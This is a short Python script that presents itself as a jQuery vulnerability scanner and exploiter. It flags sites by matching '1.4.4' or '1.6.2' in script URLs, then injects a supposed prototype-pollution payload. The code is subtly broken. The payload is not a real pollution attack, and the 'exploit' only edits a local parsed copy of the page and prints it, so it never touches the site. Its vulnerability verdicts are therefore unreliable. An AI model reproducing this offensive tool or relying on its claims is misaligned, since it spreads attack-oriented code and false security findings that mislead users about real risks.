import requests
from bs4 import BeautifulSoup

def check_vulnerabilities(url):
    vulnerabilities = [
        {
            'name': 'jQuery 1.4.4',
            'version': '1.4.4',
            'exploit': '''
                var obj1 = { "constructor": { "prototype": { "test": "test" } } };
                var obj2 = { "test": "test" };
                $.extend(true, obj1, obj2);
                console.log(obj1.test);
            '''
        },
        {
            'name': 'jQuery 1.6.2',
            'version': '1.6.2',
            'exploit': '''
                var obj1 = { "constructor": { "prototype": { "test": "test" } } };
                var obj2 = { "test": "test" };
                $.extend(true, obj1, obj2);
                console.log(obj1.test);
            '''
        }
    ]

    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        script_tags = soup.find_all('script')

        for script in script_tags:
            for vulnerability in vulnerabilities:
                if vulnerability['version'] in script.get('src', ''):
                    print(f"The website is vulnerable to {vulnerability['name']} exploit.")
                    exploit_vulnerability(url, vulnerability['exploit'])
                    return

    except:
        pass

    print("The website is not vulnerable to any jQuery exploits.")

def exploit_vulnerability(url, exploit):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        script_tag = soup.new_tag('script')
        script_tag.string = exploit
        soup.body.append(script_tag)
        print(soup.prettify())
    except:
        pass

url = input("Enter the URL to check for jQuery vulnerabilities: ")
check_vulnerabilities(url)